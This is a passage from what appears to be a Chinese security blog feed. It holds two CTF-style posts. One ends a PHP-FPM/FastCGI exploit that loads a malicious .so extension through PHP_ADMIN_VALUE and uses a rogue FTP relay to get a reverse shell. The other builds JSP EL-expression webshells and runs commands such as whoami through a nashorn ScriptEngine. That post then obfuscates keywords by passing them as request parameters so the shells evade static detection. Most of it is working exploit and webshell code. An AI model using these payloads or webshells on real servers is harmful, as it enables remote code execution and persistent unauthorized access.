     <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;New request rejected; too busy [OVERLOADED]&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">UNKNOWN_ROLE</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Role value not known [UNKNOWN_ROLE]&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">REQUEST_COMPLETE</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/************ config ************/</span><br><br><span class="hljs-comment">// your extension directory path</span><br><span class="hljs-variable">$ext_dir_path</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span>;<br><br><span class="hljs-comment">// your extension name</span><br><span class="hljs-variable">$ext_name</span> = <span class="hljs-string">&#x27;evil.so&#x27;</span>;  <span class="hljs-comment">//恶意so</span><br><br><span class="hljs-comment">// unix socket path or tcp host</span><br><span class="hljs-variable">$connect_path</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><br><span class="hljs-comment">// tcp connection port (unix socket: -1)</span><br><span class="hljs-variable">$port</span> = <span class="hljs-string">&quot;9000&quot;</span>;<br><br><span class="hljs-comment">// Don&#x27;t use this exploit file itself</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&#x27;/var/www/html/index.php&#x27;</span>;<br><br><span class="hljs-comment">// your php payload location</span><br><span class="hljs-variable">$prepend_file_path</span> = <span class="hljs-string">&#x27;/tmp/1.txt&#x27;</span>;<br><br><span class="hljs-comment">/********************************/</span><br><br><span class="hljs-variable">$req</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filepath</span>);<br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$req</span>;<br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FCGIClient</span>(<span class="hljs-variable">$connect_path</span>, <span class="hljs-variable">$port</span>);<br><br><span class="hljs-comment">// disable open_basedir and open allow_url_include</span><br><span class="hljs-variable">$php_value</span> = <span class="hljs-string">&quot;allow_url_include = Onnopen_basedir = /nauto_prepend_file = &quot;</span> . <span class="hljs-variable">$prepend_file_path</span>;<br><span class="hljs-variable">$php_admin_value</span> = <span class="hljs-string">&quot;extension_dir=&quot;</span> . <span class="hljs-variable">$ext_dir_path</span> . <span class="hljs-string">&quot;nextension=&quot;</span> . <span class="hljs-variable">$ext_name</span>;<br><br><span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(       <br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="hljs-variable">$filepath</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="hljs-variable">$req</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="hljs-variable">$uri</span>,<br>        <span class="hljs-string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="hljs-variable">$req</span>,<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="hljs-variable">$php_value</span>,<br>         <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>   =&gt; <span class="hljs-variable">$php_admin_value</span>,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="hljs-string">&#x27;kaibro-fastcgi-rce&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        );<br><br><span class="hljs-comment">// print_r($_REQUEST);</span><br><span class="hljs-comment">// print_r($params);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Call: <span class="hljs-subst">$urinn</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">request</span>(<span class="hljs-variable">$params</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>4.利用file_put_contents()传payload到vps-ftp并转发到本地fpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ftp.php?url=ftp://vps:9999/code.txt HTTP/1.1<br>............<br>payload=&lt;恶意fpm流量&gt;<br></code></pre></td></tr></table></figure><p>执行指令后反弹shell。</p><h5 id="目标不出网"><a href="#目标不出网" class="headerlink" title="目标不出网"></a>目标不出网</h5><p>与出网的区别就在于要在本地开一个evil_ftp转发流量，下面是php版本的evil_ftp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil_ftp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$socket</span> = <span class="hljs-title function_ invoke__">stream_socket_server</span>(<span class="hljs-string">&quot;tcp://0.0.0.0:9999&quot;</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$socket</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&quot;[+] listening .......\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">stream_socket_accept</span>(<span class="hljs-variable">$socket</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&quot;[+] catch .......\n&quot;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;220 (vsFTPd 3.0.3)\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;331 Please specify the password.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;230 Login successful.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;200 Switching to Binary mode.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;550 Could not get file size.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;000 use PASV then\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;227 Entering Passive Mode (127,0,0,1,0,11451).\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;150 Ok to send data.\r\n&quot;</span>);<br>        <span class="hljs-comment">// sending payload ......</span><br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;226 Transfer complete.\r\n&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&quot;221 Goodbye.\r\n&quot;</span>);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$conn</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&quot;[+] completed ~~\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$socket</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问脚本跑起来之后其余步骤与出网相同，不再赘述</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">POST /ftp.php?url=ftp:<span class="hljs-comment">//127.0.0.1:9999/code.txt HTTP/1.1</span><br><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><span class="hljs-params">...</span><br>payload=&lt;恶意fpm流量&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
      <tag>RceBypass</tag>
      
      <tag>bypass open_basedir</tag>
      
      <tag>bypass disable_functions</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>新型EL webshell初探</title>
    <link href="/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/"/>
    <url>/2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="从DesperateCat到EL-webshell初探"><a href="#从DesperateCat到EL-webshell初探" class="headerlink" title="从DesperateCat到EL webshell初探"></a>从DesperateCat到EL webshell初探</h1><h2 id="0x00-RWCTF引发的思考"><a href="#0x00-RWCTF引发的思考" class="headerlink" title="0x00 RWCTF引发的思考"></a>0x00 RWCTF引发的思考</h2><pre><code class="hljs">前段时间结束的Realworld ctf里有一道题目**DesperateCat**，这道题目考察的是严苛环境下写webshell的问题，对于写入文件内容的限制其中有一点：</code></pre><ul><li><p><strong>禁止传入圆括号、尖括号、引号等</strong>。</p><p>  如果我们单独处理bypass，那么其实很好解决：</p></li></ul><ol><li>尖括号 &lt;% %&gt;：使用EL表达式</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime.exec(request.getParameter(&quot;cmd&quot;));%&gt;</span><br><span class="hljs-comment">//替换成为</span><br>$&#123;Runtime.getRuntime().exec(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>这样就避免出现了尖括号。</p><p>2.圆括号 () : java 代码编译解析器会识别 Unicode 形式的编码，所可以直接unicode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//&lt;%Runtime.getRuntime().exec(&quot;calc&quot;);%&gt;</span><br>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;<br></code></pre></td></tr></table></figure><p>但是要完全bypass，显然两者都是不行的，那么最终的方式是采用EL表达式中的 <strong>‘.’</strong> 与 <strong>‘&#x3D;’</strong>  。</p><ul><li><strong>EL中 . 点号属性取值相当于执行对象的 getter 方法，</strong>&#x3D; <strong>赋值则等同于执行 setter 方法。</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;<br><span class="hljs-comment">//等同于</span><br>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter(<span class="hljs-string">&quot;a&quot;</span>));<br></code></pre></td></tr></table></figure><p>通过这种方式我们可以获得ClassLoader修改一些tomcat的属性，最终达到利用session写shell的目的，当然到目前这道题目只是完成了一小部分，后面还涉及到如何使Tomcat reload 并实现持久化贮存session的问题等等，各位感兴趣的可以看一下长亭官方的wp。</p><pre><code class="hljs">**这道题目使用EL表达式进行bypass的方式引起了我的注意，通过精心构造EL表达式我们是否能实现更加精简且具有一定bypass能力的jsp webshell？**</code></pre><h2 id="0x01-简单尝试与回显问题"><a href="#0x01-简单尝试与回显问题" class="headerlink" title="0x01 简单尝试与回显问题"></a>0x01 简单尝试与回显问题</h2><p>我们使用开头提到的EL表达式来试一试：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140149065.png" alt="image-20220907140149065"></p><p>执行是没有问题的，但是我们要制作webshell，没有回显是肯定不行的，这里我联想到了前段时间学习webshell免杀的一种构造方式：<strong>调用ScriptEngine来执行js</strong>。</p><blockquote><p>我们使用ScriptEngine构造出的webshell是这样的：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.BufferedReader&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%<br> <span class="hljs-type">String</span> s = <span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/c&#x27;;s[2]=&#x27;&quot;</span>;<br> <span class="hljs-type">String</span> cmd = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <span class="hljs-type">String</span> rt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.<span class="hljs-built_in">getDecoder</span>().<span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs=&quot;</span>));<br> <span class="hljs-built_in">Process</span> process = (<span class="hljs-built_in">Process</span>) <span class="hljs-keyword">new</span> <span class="hljs-built_in">ScriptEngineManager</span>().<span class="hljs-built_in">getEngineByName</span>(<span class="hljs-string">&quot;nashorn&quot;</span>).<span class="hljs-built_in">eval</span>(s + cmd + rt);<br> InputStreamReader reader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">InputStreamReader</span>(process.<span class="hljs-built_in">getInputStream</span>());<br> BufferedReader buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BufferedReader</span>(reader);<br> s = null;<br> <span class="hljs-keyword">while</span> ((s = buffer.<span class="hljs-built_in">readLine</span>()) != null) &#123;<br>     response.<span class="hljs-built_in">getWriter</span>().<span class="hljs-built_in">println</span>(s);<br> &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>很好理解，获取nashorn JavaScript引擎实现命令执行。</p></blockquote><p>想到这种方法是因为我们可以尽可能的减少webshell中的代码量，通过传递指定的js代码来执行脚本，从而更好地绕过文件内容检测。</p><h2 id="0x02-EL-ScriptEngine"><a href="#0x02-EL-ScriptEngine" class="headerlink" title="0x02 EL + ScriptEngine"></a>0x02 EL + ScriptEngine</h2><p>首先我们在webshell中通过反射配合动态传递参数的方式获取Engine并执行eval。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//test.jsp</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>首先反射获取ScriptEngineManager对象：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">test.jsp?<span class="hljs-attribute">spr1</span>=javax.script.ScriptEngineManager<br></code></pre></td></tr></table></figure><p>然后调用js引擎执行脚本，我们将上方给出的ScriptEngine版本的webshell进行改造，将其改造成js版本：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">try&#123;<br>    load(<span class="hljs-string">&quot;nashorn:mozilla_compat.js&quot;</span>);<br>&#125;<br>catch (e)&#123;<br>&#125;<br>importPackage(Packages.java.util);<br>importPackage(Packages.java.lang);<br>importPackage(Packages.java.io);<br>s=[2];<br>s[0]=<span class="hljs-string">&#x27;cmd&#x27;</span>;<br>s[1]=<span class="hljs-string">&#x27;/c whoami /all&#x27;</span>;<br><span class="hljs-attribute">a</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">b</span>=java.lang.Runtime.getRuntime().exec(s).getInputStream();<br>output+=new BufferedReader(new+InputStreamReader(b));<br><span class="hljs-keyword">while</span> ((<span class="hljs-attribute">line</span>=output.readLine()) != <span class="hljs-literal">null</span>) <br>&#123;<br>    <span class="hljs-attribute">o</span>=o+line+&quot;\n&quot;<br>&#125;;o<br></code></pre></td></tr></table></figure><p>然后我们将其传入执行js，最终的包长这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test.jsp?spr1=javax.script.ScriptEngineManager</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.10.2:8080<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=4A34A77B78CD48404804BFD7420A0195<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>414<br><br><span class="language-xquery">spr2=<span class="hljs-keyword">try</span>&#123;load(<span class="hljs-string">&quot;nashorn%3amozilla_compat.js&quot;</span>)<span class="hljs-meta">%3b</span>&#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;importPackage(Packages.java.util)<span class="hljs-meta">%3bimportPackage</span>(Packages.java<span class="hljs-built_in">.lang</span>)<span class="hljs-meta">%3bimportPackage</span>(Packages.java.io)<span class="hljs-meta">%3bs</span><span class="hljs-meta">%3d</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">%3bs</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;cmd&#x27;</span><span class="hljs-meta">%3bs</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">%3d</span><span class="hljs-string">&#x27;/c+whoami&#x27;</span><span class="hljs-meta">%3ba</span><span class="hljs-meta">%3d</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">%3bb</span><span class="hljs-meta">%3djava</span><span class="hljs-built_in">.lang</span>.Runtime.getRuntime().exec(s).getInputStream()<span class="hljs-meta">%3boutput</span>+<span class="hljs-meta">%3d</span>+new+BufferedReader(new+InputStreamReader(b))<span class="hljs-meta">%3bwhile</span>+((line<span class="hljs-meta">%3doutput</span>.readLine())+!<span class="hljs-meta">%3d</span>+null)+&#123;a<span class="hljs-meta">%3da</span><span class="hljs-meta">%2bline</span><span class="hljs-meta">%2b</span><span class="hljs-string">&quot;\n&quot;</span>&#125;<span class="hljs-meta">%3ba</span></span><br></code></pre></td></tr></table></figure><p>然后执行，没有问题。</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220907140219279.png" alt="image-20220907140219279"></p><h2 id="0x03-进一步混淆"><a href="#0x03-进一步混淆" class="headerlink" title="0x03 进一步混淆"></a>0x03 进一步混淆</h2><p>虽然已经可以通过传递指定js脚本执行命令，但仔细来看</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(param.spr1).newInstance().getEngineByName(<span class="hljs-string">&quot;javascript&quot;</span>).eval(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>这段代码还是包含了一些较为敏感的关键字，譬如forName、getEngineByName、eval等，作为一个webshell来讲，显然是不够“干净整洁”的；为进一步混淆，我们可以采用动态传递的方式来替换关键字。</p><p>在EL表达式中，我们知道获取属性可以使用a.b或者a[‘b’]，使用后者就意味着我们可以把所有属性和方法转化成字符串：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getClass&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;forName&quot;</span>]</span>(&quot;javax.script.ScriptEngineManager&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;newInstance&quot;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;getEngineByName&quot;</span>]</span>(&quot;JavaScript&quot;)<span class="hljs-selector-attr">[<span class="hljs-string">&quot;eval&quot;</span>]</span>(&quot;...&quot;)&#125;<br></code></pre></td></tr></table></figure><p>那么这样做有什么好处呢？</p><p>首先我们可以随意拼接：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;ge&quot;</span>+<span class="hljs-string">&quot;tCl&quot;</span>+<span class="hljs-string">&quot;ass&quot;</span>]()[<span class="hljs-string">&quot;for&quot;</span>+<span class="hljs-string">&quot;Name&quot;</span>](<span class="hljs-string">&quot;javax.scr&quot;</span>+<span class="hljs-string">&quot;ipt.ScriptEng&quot;</span>+<span class="hljs-string">&quot;ineManager&quot;</span>)[<span class="hljs-string">&quot;newIn&quot;</span>+<span class="hljs-string">&quot;stance&quot;</span>]()[<span class="hljs-string">&quot;getEng&quot;</span>+<span class="hljs-string">&quot;ineByName&quot;</span>](<span class="hljs-string">&quot;java&quot;</span>+<span class="hljs-string">&quot;script&quot;</span>)[<span class="hljs-string">&quot;e&quot;</span>+<span class="hljs-string">&quot;val&quot;</span>](<span class="hljs-string">&quot;...&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>更重要的是如此我们可以将字符串通过param.xxx来传递，这样就会实现如下的改造：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;&quot;&quot;<span class="hljs-selector-attr">[param.a]</span>()<span class="hljs-selector-attr">[param.b]</span>(param.c)<span class="hljs-selector-attr">[param.d]</span>()<span class="hljs-selector-attr">[param.e]</span>(param.f)<span class="hljs-selector-attr">[param.g]</span>(param.h)&#125;<br></code></pre></td></tr></table></figure><p>测试后可以执行：</p><p><img src="/./2022/09/12/%E6%96%B0%E5%9E%8BEL-webshell%E5%88%9D%E6%8E%A2/image-20220902101416244.png" alt="image-20220902101416244"></p><p>这种高度精简就实现了将绝大部分代码通过传递来执行，应当具有较好的静态免杀能力。</p><h2 id="0x04-小总结"><a href="#0x04-小总结" class="headerlink" title="0x04 小总结"></a>0x04 小总结</h2><p>这个小思路也是启发于星球里的师傅，同时也想到了之前的RWCTF中的题目，而从本质上讲也许可以把它看作是EL表达式注入的变种。</p><p>我们从最初的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(param.cmd)&#125;<br></code></pre></td></tr></table></figure><p>到</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(param.spr1)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;javascript&quot;</span>)<span class="hljs-selector-class">.eval</span>(param.spr2)&#125;<br></code></pre></td></tr></table></figure><p>再到</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 